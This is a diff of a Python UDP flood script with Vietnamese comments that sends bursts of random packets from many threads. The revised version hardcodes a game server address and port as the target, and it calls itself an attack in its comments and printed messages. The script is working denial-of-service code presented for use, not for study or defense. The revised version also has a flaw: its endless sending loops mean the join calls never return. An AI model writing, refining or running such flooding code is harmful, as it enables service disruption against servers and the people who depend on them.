@@ -1,34 +1,42 @@
 import socket
 import random
-import threading
 import time
-import sys
+import threading
 
-# Hàm gửi gói UDP
-def udp_flood_with_delay(ip, port, duration, delay_ms):
-    timeout = time.time() + duration
+# Hàm gửi gói tin UDP
+def send_udp_packet(ip, port, delay_ms):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(512)  # Chọn kích thước nhỏ cho gói tin
-
-    while time.time() < timeout:
+    data = random._urandom(512)  # Kích thước gói tin ngẫu nhiên
+    while True:
         sock.sendto(data, (ip, port))
-        time.sleep(delay_ms / 1000.0)  # Điều chỉnh thời gian giữa các gói tin
+        time.sleep(delay_ms / 1000.0)  # Delay giữa các gói tin (ms)
 
-# Hàm tấn công với nhiều luồng
-def start_attack(ip, port, threads, duration, delay_ms):
-    print(f"Đang gửi UDP đến {ip}:{port} với {threads} luồng, delay {delay_ms}ms trong {duration}s...")
-    for _ in range(threads):
-        threading.Thread(target=udp_flood_with_delay, args=(ip, port, duration, delay_ms)).start()
+# Hàm bắt đầu tấn công với nhiều luồng và delay
+def udp_flood(ip, port, duration, num_threads, delay_ms):
+    timeout = time.time() + duration  # Thời gian kết thúc tấn công
+    threads = []
 
+    # Tạo và bắt đầu các luồng
+    for _ in range(num_threads):
+        t = threading.Thread(target=send_udp_packet, args=(ip, port, delay_ms))
+        threads.append(t)
+        t.start()
+
+    # Chờ cho tất cả luồng kết thúc sau khi thời gian tấn công đã trôi qua
+    time.sleep(duration)
+
+    # Dừng tất cả các luồng
+    for t in threads:
+        t.join()
+
+# Main function
 if __name__ == "__main__":
-    if len(sys.argv) != 6:
-        print(f"Usage: python {sys.argv[0]} <IP> <PORT> <THREADS> <TIME> <DELAY_MS>")
-        sys.exit(1)
+    ip = "192.168.1.100"   # IP của server game
+    port = 7777             # Cổng của server game
+    duration = 60           # Thời gian tấn công (giây)
+    num_threads = 100      # Số lượng luồng
+    delay_ms = 10          # Delay giữa các gói tin (ms)
 
-    ip = sys.argv[1]
-    port = int(sys.argv[2])
-    threads = int(sys.argv[3])
-    duration = int(sys.argv[4])
-    delay_ms = int(sys.argv[5])
-
-    start_attack(ip, port, threads, duration, delay_ms)
+    print(f"Bắt đầu tấn công UDP vào {ip}:{port} trong {duration} giây với {num_threads} luồng.")
+    udp_flood(ip, port, duration, num_threads, delay_ms)
+    print("Kết thúc tấn công.")
